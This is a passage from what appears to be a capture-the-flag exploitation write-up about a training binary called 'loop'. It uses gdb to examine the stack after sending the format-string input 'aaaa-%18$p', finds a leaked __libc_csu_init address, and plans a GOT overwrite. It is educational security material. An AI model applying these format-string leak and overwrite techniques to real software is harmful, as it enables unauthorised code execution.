...
##### Let's first dig in with gdb

Let's set up a breakpoint at the `func03`, as we saw earlier the `func02` takes the input, ignore the fact that it takes input for now  just consider a breakpoint that we have just put so that we can examine stack.
...
Starting program: /home/robin/Pwning/training/pwn01/loop 
Welcome to VietNam!!!
What's your name? aaaa-%18$p

-- snip --

gef➤  x/20a $rsp
0x7fffffffdca8:	0x4008a4 <main+159>	0x7fffffffddf8
0x7fffffffdcb8:	0x1f7dd7660	0x3831252d61616161
0x7fffffffdcc8:	0xa7024	0x1
0x7fffffffdcd8:	0x40090d <__libc_csu_init+77>	0x7ffff7de59a0 <_dl_fini>
0x7fffffffdce8:	0x0	0x4008c0 <__libc_csu_init>
0x7fffffffdcf8:	0x400630 <_start>	0x7fffffffddf0
0x7fffffffdd08:	0xfd6f47bb29077600	0x4008c0 <__libc_csu_init>
0x7fffffffdd18:	0x7ffff7a05b97 <__libc_start_main+231>	0x1
0x7fffffffdd28:	0x7fffffffddf8	0x100008000
0x7fffffffdd38:	0x400805 <main>	0x0
```

As you can see we have the `libc_csu_init` which is in the stack which could be found at the 18th index of the stack exactly the one found. So, as we have a format string vulnerability we just have to perform a abritrary overwrite to one of the GOT symbol. Now, this could've been way lot more simpler **if ASLR was disabled**.


Now, let's get the general idea of things that we should do:-
* We found a strange address in one of those leaks which is `0x4008c0` at the index `18` can be found by providing `AAAA-$%18$lx` as input, this is `libc_csu_init` which gets called everytime when `libc_start_main` gets invoked.
